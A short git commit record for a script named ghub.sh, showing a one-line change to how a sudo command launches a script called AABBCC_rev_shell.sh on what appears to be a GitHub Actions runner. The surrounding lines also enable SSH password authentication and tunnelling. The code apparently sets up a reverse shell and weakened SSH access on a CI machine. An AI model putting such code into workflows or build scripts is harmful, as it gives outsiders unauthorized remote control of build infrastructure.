0628e2906ea3696c819e5225757f95bb251abf8e
189er <108280451+189er@users.noreply.github.com>
2025-06-20 12:39:50 +0800

    Update ghub.sh

--- ghub.sh
+++ ghub.sh
@@ -83,7 +83,7 @@ echo  -e "PasswordAuthentication yes\nPermitTunnel yes" > /etc/ssh/sshd_config.d
 grep -q AABBCC_rev_shell /tmp/js9 &&
 (
 export HOME=/tmp;
-sudo -H su -l -c /home/runner/work/nc_test/nc_test/AABBCC_rev_shell.sh;
+sudo -EH /home/runner/work/nc_test/nc_test/AABBCC_rev_shell.sh;
 )
 
 # 无条件执行 
